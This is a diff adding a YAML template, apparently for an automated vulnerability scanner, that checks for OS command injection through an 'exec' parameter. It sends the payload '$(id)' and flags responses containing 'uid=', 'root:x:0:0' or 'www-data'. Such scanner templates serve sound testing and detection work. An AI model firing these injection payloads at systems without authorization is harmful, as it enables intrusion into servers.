@@ -1,0 +1,23 @@
+id: cmdi6-0527
+name: 'Shell injection in exec'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via exec'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      exec:
+        - '$(id)'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'www-data'
